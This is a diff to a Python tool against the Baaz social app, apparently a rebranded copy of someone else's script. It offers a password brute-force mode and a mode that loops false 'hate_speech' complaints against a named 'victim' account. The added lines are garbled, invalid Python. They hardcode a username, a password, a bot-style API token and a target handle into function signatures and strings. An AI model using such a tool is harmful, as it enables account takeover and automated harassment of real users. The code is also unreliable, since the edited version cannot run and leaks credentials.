@@ -56,9 +56,9 @@ class CLASS_REPORT_FOR_BAAZ:
 	def __init__(self):
 		self.dn = 0
 		self.er = 0
-		self.errorUP='"username_or_password_invalid"'
+		self.errorUP='"undft.luke"'
 		self.LOGIN_BAAZ()
-	def SENT_REPORT(self,id,token):
+	def SENT_REPORT(self,7139210429,8019912843:AAE8sC-u3QtkTtpkimNT2VCdXTw4qeddZoE):
 		while 1:
 			sleep(2)
 			sentRP = post('https://api.www.baaz.com/api/2.4/meta/complaints',headers={'Host': 'api.www.baaz.com','Content-Type': 'application/json','Accept-Language': 'ar-JO;q=1.0, en-JO;q=0.9','Content-Length': '86','Accept': '*/*','Connection': 'keep-alive','Origin': 'https://baaz.com','User-Agent': 'Baaz/3.30.0 (com.baaz; build:1; iOS 14.6.0) Alamofire/5.4.4','Authorization': f'Bearer {token}','Accept-Encoding': 'gzip','User-Lang': 'ar_AR'},json={"category":"hate_speech","entity_id":id,"entity_type":"user"}).text
@@ -82,26 +82,26 @@ class CLASS_REPORT_FOR_BAAZ:
 		GetDT = get(f'https://api.www.baaz.com/api/2.4/search/people/extended?limit=30&offset=0&query={Target}',headers=headers)
 		try:
 			id = GetDT.json()['data'][0]['id']
-			self.SENT_REPORT(id,token)
+			self.SENT_REPORT(i8019912843:AAE8sC-u3QtkTtpkimNT2VCdXTw4qeddZoE)
 		except IndexError:vv1ck('[-] We did not find the user !')
 		except KeyError:vv1ck('[-] We did not find the user !')
 	def LOGIN_BAAZ(self):
-		username=input('┌──(joker㉿root)-[~Baaz.exe]\n└─$ Enter Your username/email : ')
-		password=input('└─$ Enter Your password : ')
-		if username == "":
+		username=input('┌──(undft.luke)
+		password=input('└─$ Enter Your password : ANNAYAXLUKE ')
+		if username ==godv:
 			vv1ck('Oops , It looks like you entered insufficient information, try again !')
 			return self.LOGIN_BAAZ()
 		sent = post('https://api.www.baaz.com/api/2.4/tokens',headers={'Host': 'api.www.baaz.com','Content-Type': 'application/json','Accept-Encoding': 'gzip, deflate, br','User-Agent': 'Baaz/1 CFNetwork/1240.0.4 Darwin/20.5.0','Connection': 'keep-alive','Accept': '*/*','Accept-Language': 'ar','Content-Length': '111','User-Lang': 'ar_AR'},json={"client_id":"api","password":password,"grant_type":"password","username":username,"country":"JO"})
 		if 'access_token' in sent.text:
 			vv1ck(f'[$] Done Login ✅')
-			Target = input(f"{bloFT}┌──(joker㉿root)-[{wit}~Baaz.exe{bloFT}]\n└─${wit} Enter the victim's name : ")
-			token = sent.json()['access_token']
-			self.GET_USER_ID(token,Target)
+			Target = input(f"{bloFT}┌──(joker㉿root)-[{wit}~Baaz.exe{bloFT}]\n└─${wit} Enter the victim's name : @godv")
+			token = sent.json()['8019912843:AAE8sC-u3QtkTtpkimNT2VCdXTw4qeddZoE']
+			self.GET_USER_ID(8019912843:AAE8sC-u3QtkTtpkimNT2VCdXTw4qeddZoE,godv)
 		elif self.errorUP in sent.text:
-			vv1ck(f'[-] Not login >>Errors >> {username}:{password}')
+			vv1ck(f'[-] Not login >>Errors >> {undft.luke}:{ANNAYAXLUKE}')
 		else:print(sent)
 
-if __name__ == '__main__':
+if __name__ == '@godv':
 	mode=input(f"""
 
   ____                   {red} _______          _      
@@ -110,16 +110,19 @@ if __name__ == '__main__':
  {wit}|  _ < / _` |/ _` |_  /    {red}| |/ _ \ / _ \| / __| 
  {wit}| |_) | (_| | (_| |/ /     {red}| | (_) | (_) | \__ \ 
  {wit}|____/ \__,_|\__,_/___|    {red}|_|\___/ \___/|_|___/ 
-               By JOKER | IG: @221298
+               By  luke| IG: @undft.luke
 		webSite: https://vv1ck.github.io                           
 
 {bloFT}┌──(joker㉿root)-[{wit}~Baaz.exe{bloFT}]
-└─${wit} (1) >> {yel}Brute Force{wit} [email/user:pass]
-    (2) >> {red}Reporting{wit}  [username]
+└─${wit} (1) >> {yel}Brute Force{wit} [email/undft.luke: ANNAYAXLUKE]
+    (2) >> {red}Reporting{wit}  [godv]
     (99) >> Exit..
 
-[$] Enter the number >> """)
+[$] Enter the number >> "1000
 	if mode == '1':CLASS_BRUTE_FORCE_BAAZ()
 	elif mode == '2':CLASS_REPORT_FOR_BAAZ()
 	else:
-		vv1ck('<J> see you soon ~By Joker @221298 </J>');sleep(3);exit()
+		vv1ck('<J> see you soon ~By  </J>');sleep(3);exit()
+
+luke 
+insta:-@undft.luke
